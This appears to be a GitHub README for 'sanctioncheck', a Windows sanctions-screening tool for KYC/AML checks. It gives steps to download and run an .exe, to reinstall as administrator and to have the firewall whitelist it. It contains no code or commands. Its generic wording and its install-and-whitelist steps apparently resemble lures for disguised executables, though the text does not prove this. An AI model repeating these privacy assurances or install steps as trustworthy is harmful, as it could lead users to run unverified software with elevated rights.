# 🛡️ sanctioncheck - Screen names against international sanctions lists

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/dovedownpat422/sanctioncheck)

## 📌 About This Tool

Sanctioncheck helps you verify individuals or companies against global watchlists. Businesses use this software to meet Know Your Customer (KYC) and Anti-Money Laundering (AML) requirements. The tool scans data from the United Nations, the European Union, the Office of Foreign Assets Control, and other regulatory bodies.

You do not need programming knowledge to run this software. It processes names and provides results indicating if a person or entity appears on a restrictive list.

## 📋 System Requirements

To run the software, ensure your computer meets these requirements:

* Operating System: Windows 10 or Windows 11.
* Memory: 4 gigabytes of RAM.
* Storage: 200 megabytes of free space.
* Internet Connection: Required for live updates to sanctions lists.

## 📥 Installation Steps

Follow these steps to set up the software on your machine:

1. Visit the [official release page](https://github.com/dovedownpat422/sanctioncheck) to download the application.
2. Select the latest version listed under the Releases section.
3. Download the file ending in .exe for your Windows system.
4. Locate the file in your Downloads folder.
5. Double-click the file to begin the setup process.
6. Follow the on-screen prompts to finish the installation.

## 🚀 How to Run a Check

Once you install the software, follow this process to check a name:

1. Open the Sanctioncheck application from your Start menu.
2. Locate the input box on the main screen.
3. Type the full legal name of the person or company.
4. Click the search button.
5. Wait for the status indicator to turn green.
6. Review the results displayed in the middle panel.

The tool checks your entry against active databases. If the software finds a potential match, it displays the specific list it identified. If the software finds no matches, it shows a clear status indicating the entity appears clean.

## 🔍 Understanding Results

The tool categorizes results into two states:

* No Match Found: The name does not appear on any checked sanctions databases.
* Potential Match: The software found a name similarity. Review the details provided by the tool to confirm if the match involves the person you represent.

Always document your findings. You can export the results to a text file for your internal records.

## 🛠️ Configuration and Updates

The software updates its database every time you launch it. An active internet connection ensures that you use the most current sanctions data. If you operate in a location with restricted internet access, the tool will notify you that it is running in offline mode using the last stored list.

You can change settings in the options menu:

* Proxy Settings: Enable if your office network requires a proxy to reach web services.
* Logging: Activate this to keep a history of every search you perform.
* Output Location: Choose where the application saves your reports.

## 🤝 Support and Assistance

If the software fails to launch or displays errors, try these steps:

1. Restart your computer. 
2. Ensure you have the latest updates for your Windows operating system.
3. Run the installer again as an administrator.

Common errors usually result from firewall settings. If your corporate firewall prevents connection, ask your technical support staff to whitelist the application. They can reach out to the project maintainers for specific server addresses.

## 🛡️ Data Privacy

Your search queries remain on your machine. This software does not send your customer list to external servers. It only pulls current sanctions data into your local folder. This approach maintains your compliance with privacy laws and keeps your sensitive information secure inside your local environment.

## 📦 Maintenance

Keep the folder clean by running the cleanup tool in the settings menu once a month. This action deletes old reports and temporary files. The core application logic stays separate from your search history, so deleting these files will not affect the ability of the program to run updates.
